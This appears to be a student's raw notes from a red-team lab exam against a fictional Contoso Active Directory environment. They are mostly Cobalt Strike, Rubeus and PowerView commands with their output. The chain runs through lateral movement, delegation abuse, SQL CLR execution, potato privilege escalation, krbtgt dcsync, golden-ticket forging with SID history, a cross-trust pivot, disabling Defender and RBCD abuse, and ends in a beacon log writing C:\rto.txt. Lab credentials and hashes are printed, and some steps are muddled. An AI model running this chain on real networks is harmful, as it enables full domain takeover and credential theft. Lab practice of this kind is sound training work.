Your objective is to simulate an advanced threat and gain access to a secure storage server - enc-fs-1.contoso.enclave. You must prove access by writing a text file to its hard disk at the location C:\rto.txt. The content does not matter.

# Rules of Engagement

## Authorised Target Spaces

You are authorised to attack the following domains and IPs:

- 10.10.122.0/23 (dublin.contoso.com)
- 10.10.120.0/24 (contoso.com)
- 10.10.124.0/24 (contoso.enclave)

## Restricted Hosts

You are not authorised to attack the following domains and IPs:

- 10.10.x.254
- 10.10.124.1 (enc-dc-1.contoso.enclave)
- 10.10.124.200 (elk.contoso.enclave)

# Operator Notes:

To modify your C2 profile:

1. ssh attacker@10.0.0.5 and login with Passw0rd!.
2. cd /opt/cobaltstrike/profiles
3. Change _default.profile_ as needed.
4. Run sudo /usr/bin/docker restart cobalt to restart the Docker container.
5. If the container fails to start, run sudo /usr/bin/docker logs cobalt to see the errors.

---

## Set the beacon size
```
set tasks_max_size "2097152";
```
# note
is admin:
```
 Niall Wallace
```
id dub domain

BRO I GUESS I SHOULD HAVE IMPERSONATE THIS USER, NOT THE ADMIN?!
i should have run this:
```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

Finding db instance:
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

LINK THE DB VIA A LOW LEVEL USER!

SQL from dub-web-1
```
krb_s4u /ticket:doIF4jNPTQ== /service:MSSQLSvc/dub-sql-1.dublin.contoso.com /altservice:cifs /impersonateuser:Administrator
```

uff:
```

Action: List Kerberos Tickets (All Users)


--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x6162a6  | Administrator @ DUBLIN.CONTOSO.COM       | cifs/dub-sql-1.dublin.contoso.com 
```

tdobson hash:
```
 [00000003] Primary
	 * Username : tdobson
	 * Domain   : DUBLIN
	 * NTLM     : 4a0f9bc164edc4aab545196cce6d7c9d
	 * SHA1     : 27e227423cad68e99a36abecabf1a7acebd7fa91
	 * DPAPI    : 5680fc1051d04d4055279e2b729e9be9
```


# The Process
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump scshell64 dub-wkstn-1 smb
```

2. Still ticket of tdobson.
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump scshell64 dub-web-1 smb
```


## DB admin
```
IAPPLETON@DUBLIN.CONTOSO.COM
iappleton
```
## Now Constrain delegation part
```
krb_s4u /ticket:doVE9TTy5DT02pJzAloAMCAQKhHjAcGwZrcmJ0Z3QbEkRVQkxJTi5DT05UT1NPLkNPTQ== /service:MSSQLSvc/dub-sql-1.dublin.contoso.com:1433 /impersonateuser:iappleton
```
Then:
```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\iapp.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
```
```
make_token DUBLIN\iappleton FakePass
```

## Bloodhound pass
```
eA%N4frBrnn2
```

## SQL thing
```
sql-query dub-sql-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```
```
sql-enableclr dub-sql-1
```

Then created my dll
```
sql-clr dub-sql-1 C:\Users\Attacker\source\repos\MyProcedure\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```
```
link dub-sql-1 <TAB>
```
```
sql-disableclr dub-sql-1
```

## PrivEsc


```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```
```
connect localhost 1337
```

## Admin is cached!
Lets do DC
```
	dcsync dublin.contoso.com DUBLIN\krbtgt
```

Hash:
```
ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56
```

SID:
```
	ldapsearch (objectClass=domain) --attributes objectSid
```
```
objectSid: S-1-5-21-2958544638-1589230383-838459903
```

parnet sid:
```
	ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```
```
objectSid: S-1-5-21-1076548718-1118529210-2193484809-519
```

#### The command:
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-2958544638-1589230383-838459903 /sids:S-1-5-21-1076548718-1118529210-2193484809-519 /nowrap
```

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dub-admin.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
```

```
make_token CONTOSO\admin FakePass
```

DC is down now!
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```
```
jump scshell64 lon-dc-1 smb
```


## Trust
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
```

```
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname contoso.enclave --dn DC=contoso,DC=enclave
```

```
S-1-5-21-1076548718-1118529210-2193484809-2601
```
```
ldapsearch (objectSid=S-1-5-21-1076548718-1118529210-2193484809-2601)
```
OR:
```
ldapsearch (objectSid=S-1-5-21-1076548718-1118529210-2193484809-2601) --attributes samAccountType,distinguishedName
```

```
[11/02 02:38:24] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[11/02 02:38:24] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[11/02 02:38:27] [+] host called home, sent: 12673 bytes
[11/02 02:38:27] [+] received output:
Binding to 10.10.120.1
[11/02 02:38:27] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (objectSid=S-1-5-21-1076548718-1118529210-2193484809-2601)
[*] Scope of search value: 3
[*] Returning specific attribute(s): *

--------------------
objectClass: top, group
cn: Enclave Access
member: CN=Nikki Green,CN=Users,DC=contoso,DC=com
distinguishedName: CN=Enclave Access,CN=Users,DC=contoso,DC=com
instanceType: 4
whenCreated: 20250404213904.0Z
whenChanged: 20250410075624.0Z
uSNCreated: 24666
uSNChanged: 32842
name: Enclave Access
objectGUID: 18c2198b-3103-4ad4-8f0c-6c0388ab706f
objectSid: S-1-5-21-1076548718-1118529210-2193484809-2601
sAMAccountName: Enclave Access
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=contoso,DC=com
dSCorePropagationData: 16010101000000.0Z
retreived 1 results total

```

Finding the user:
```
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Enclave Access,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
```

```
--------------------
distinguishedName: CN=Nikki Green,CN=Users,DC=contoso,DC=com
```

6. Find users where members of the "Contoso Users" group may have access to:
```
ldapsearch "(objectClass=groupPolicyContainer)" --hostname contoso.enclave --dn DC=contoso,DC=enclave --attributes displayName,gPCFileSysPath
```

OUT:
```
Scope of search value: 3
[*] Returning specific attribute(s): displayName,gPCFileSysPath

--------------------
displayName: Default Domain Policy
gPCFileSysPath: \\contoso.enclave\sysvol\contoso.enclave\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
--------------------
displayName: Default Domain Controllers Policy
gPCFileSysPath: \\contoso.enclave\sysvol\contoso.enclave\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
--------------------
displayName: Enclave Access
gPCFileSysPath: \\contoso.enclave\SysVol\contoso.enclave\Policies\{0FF094F9-69ED-476D-8DCB-1820DE60A666}
--------------------
displayName: WinRM
gPCFileSysPath: \\contoso.enclave\SysVol\contoso.enclave\Policies\{034D0B5C-FB95-45D9-AB23-AFE530815043}
--------------------
displayName: Windows Firewall
gPCFileSysPath: \\contoso.enclave\SysVol\contoso.enclave\Policies\{A619DC85-B720-4EF9-B845-F99110EE34D7}
--------------------
displayName: PowerShell Logging
gPCFileSysPath: \\contoso.enclave\SysVol\contoso.enclave\Policies\{E5F78E31-450B-4F86-89F7-671928A7B46B}
--------------------
displayName: Windows Defender
gPCFileSysPath: \\contoso.enclave\SysVol\contoso.enclave\Policies\{86FF1D7F-BCE0-47A2-841C-E0383D80644F}
retreived 7 results total
```

Download it:
```
download \\contoso.enclave\SysVol\contoso.enclave\Policies\{0FF094F9-69ED-476D-8DCB-1820DE60A666}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

Confirming the membership
```
ldapsearch "(objectSid=S-1-5-21-1330904164-3792538338-293942156-2103)" --hostname enc-dc-1.contoso.enclave --dn DC=contoso,DC=enclave --attributes samAccountType,samAccountName,member
```

OUT:
```
[*] Distinguished name: DC=contoso,DC=enclave
[*] Filter: (objectSid=S-1-5-21-1330904164-3792538338-293942156-2103)
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountType,samAccountName,member

--------------------
member: CN=S-1-5-21-1076548718-1118529210-2193484809-2601,CN=ForeignSecurityPrincipals,DC=contoso,DC=enclave
sAMAccountName: Enclave Access
sAMAccountType: 536870912
retreived 1 results total
```

Find where the GPO has access to:
```
ldapsearch "(&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{0FF094F9-69ED-476D-8DCB-1820DE60A666}*))" --hostname contoso.enclave --dn DC=contoso,DC=enclave --attributes objectClass,name
```

find what computer exist:
```
ldapsearch "(samAccountType=805306369)" --hostname contoso.enclave --dn DC=contoso,DC=enclave --attributes distinguishedName
```

Used krb_dump 

```
dcsync contoso.com CONTOSO\ngreen
```

```
krb_asktgt /user:ngreen /aes256:25307799aa98581a28d00e42b34b37eab0909c098d9f1c68a1569d7fe21c09e9
```

```
krb_asktgs /service:krbtgt/contoso.enclave /ticket:[TGT]
```

```
krb_asktgs /service:cifs/enc-jmp-1.contoso.enclave /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:[INTER-REALM]
```

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ngreen-jump.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
```

```
make_token CONTOSO\ngreen FakePass
```

this one worked:
```
ls \\enc-jmp-1.contoso.enclave\c$
```

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

```
jump scshell64 enc-jmp-1.contoso.enclave smb
```


# we are good till above commands

```
krb_asktgt /user:Administrator /aes256:8121c218316a59fcc5db080b204dbe21750d9cdd47e84df441784bbe1d0db2bc
```

```
mimikatz sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:0dde0e62341ba59c5520fab03d0d06bd /run:%COMSPEC%
```

# I guess its Resource-Based Constrained Delegation

So we should do this:

## Socks via beacon
```
socks 1080 socks5
```
## Adding proxy
1. **Profile > Proxy Servers**
2. Click **Add**.
3. Address: +++10.0.0.5+++
4. Port: +++1080+++
5. Protocol: **SOCKS Version 5**
6. Click **OK**.

## Proxification Rules
1. Click **Add**.
2. Name: +++Beacon+++
3. Target hosts: +++10.10.120.0/23+++  # i will make it to my contoso.enclave CIDR.
4. Action: **Proxy SOCKS5 10.0.0.5**
5. Click **OK**.

## DNS conf
Open Powershell with Admin level access

```
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.124.1 enc-dc-1 enc-dc-1.contoso.enclave contoso.enclave"
```

Change it to your case!

## Defender
Turn Off defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
```


## Creds
Run this
```
runas /netonly /user:CONTOSO powershell
```

Request a service ticket for LDAP through the proxy.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/enc-dc-1 /dc:enc-dc-1 /ptt
```

## Enumeration

1. Import PowerView.
```
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```

2. Find principals that have _WriteProperty_ privileges on the _msDS-AllowedToActOnBehalfOfOtherIdentity_ attribute of computers.
```
Get-DomainComputer -Server 'enc-dc-1' | Get-DomainObjectAcl -Server 'enc-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```
-> Make it to your case!

THIS ONE WORKED!
```
Get-DomainComputer -Server 'enc-dc-1' |
    Get-DomainObjectAcl -Server 'enc-dc-1' |
    ? {
        $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and
        $_.ActiveDirectoryRights -Match 'WriteProperty'
    } |
    select ObjectDN, SecurityIdentifier
```

> This will show that a principal ending in RID 1107 has this privilege over multiple computers.


This reutnr this:

```
usncreated : 20560 grouptype : DOMAIN_LOCAL_SCOPE, SECURITY samaccounttype : ALIAS_OBJECT samaccountname : Enclave Access whenchanged : 4/4/2025 9:39:21 PM objectsid : S-1-5-21-1330904164-3792538338-293942156-2103 objectclass : {top, group} cn : Enclave Access usnchanged : 20569 dscorepropagationdata : 1/1/1601 12:00:00 AM name : Enclave Access distinguishedname : CN=Enclave Access,CN=Users,DC=contoso,DC=enclave member : CN=S-1-5-21-1076548718-1118529210-2193484809-2601,CN=ForeignSecurityPrincipals,DC=contoso,DC=enclave whencreated : 4/4/2025 9:36:29 PM instancetype : 4
```
3. Query LDAP to discover what this SID is (a user or group, etc).
```
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-1330904164-3792538338-293942156-2103)' -Server 'enc-dc-1'
```
> This will show that it’s a domain group called “Server Admins”, and that rsteel is a member.

4. Go back to Cobalt Strike and use the high-integrity Beacon to dump the TGT for rsteel.

5. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
```

6. Request a new LDAP service ticket with rsteel’s TGT.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/enc-dc-1 /dc:enc-dc-1 /ptt
```


**This one worked!**
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/enc-dc-1 /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:[INTER-REALM] /ptt
```
# Exploitation

```PowerShell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'enc-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

OR:

```
‌powerpick Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server enc-dc-1 | Select-Object Name, PrincipalsAllowedToDelegateToAccount
```
> This shows that there’s already an RBCD configuration between lon-ws-1 and lon-fs-1. We need to be careful not to remove this by mistake.

2. Add a new RBCD config between _lon-fs-1_ and _lon-wkstn-1_, making sure not to overwrite the existing entry.

```powershell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'

$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'

Set-ADComputer -Identity 'enc-fs-1' -PrincipalsAllowedToDelegateToAccount $jmp1,$fs1 -Server 'enc-dc-1'
```

3. Verifying...
```powershell
Get-ADComputer -Identity 'enc-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'enc-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

4. Go back to Cobalt Strike again, and dump the TGT for _lon-wkstn-1_.
> So we need the computer ticket?

5. Then forge a ticket with the following command
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:enc-jmp-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1 /ticket:[TGT] /dc:enc-dc-1 /outfile:C:\Users\Attacker\Desktop\
```

6. To auth
```
make_token ENCLAVE\admin FakePass
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
```

7. to check the permission
```

```

To restore:
```powershell
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'


Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```



profffe

```
  Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/10/2025 12:54:51   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     11/09/2026 03:50:42   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     04/04/2025 21:14:29   System Volume Information
          dir     04/04/2025 21:14:29   Users
          dir     04/18/2025 12:09:20   Windows
 12kb     fil     11/08/2026 19:48:30   DumpStack.log.tmp
 1gb      fil     11/08/2026 19:48:30   pagefile.sys

[11/09 06:29:29] beacon> cd \\enc-fs-1\c$
[11/09 06:29:29] [*] cd \\enc-fs-1\c$
[11/09 06:29:29] [+] host called home, sent: 29 bytes
[11/09 06:29:31] beacon> pwd
[11/09 06:29:31] [*] Tasked beacon to print working directory
[11/09 06:29:32] [+] host called home, sent: 16 bytes
[11/09 06:29:32] [*] Current directory is \\enc-fs-1\c$
[11/09 06:30:24] beacon> upload C:\Users\Attacker\Desktop\rto.txt
[11/09 06:30:24] [*] Tasked beacon to upload C:\Users\Attacker\Desktop\rto.txt as rto.txt
[11/09 06:30:24] [+] host called home, sent: 39 bytes
[11/09 06:30:28] beacon> ls
[11/09 06:30:28] [*] Tasked beacon to list files in .
[11/09 06:30:28] [+] host called home, sent: 27 bytes
[11/09 06:30:28] [*] Listing: \\enc-fs-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/10/2025 12:54:51   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     11/09/2026 03:50:42   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     04/04/2025 21:14:29   System Volume Information
          dir     04/04/2025 21:14:29   Users
          dir     04/18/2025 12:09:20   Windows
 12kb     fil     11/08/2026 19:48:30   DumpStack.log.tmp
 1gb      fil     11/08/2026 19:48:30   pagefile.sys
 12b      fil     11/09/2026 06:30:24   rto.txt

[11/09 06:30:32] beacon> pwd
[11/09 06:30:32] [*] Tasked beacon to print working directory
[11/09 06:30:32] [+] host called home, sent: 16 bytes
[11/09 06:30:32] [*] Current directory is \\enc-fs-1\c$
```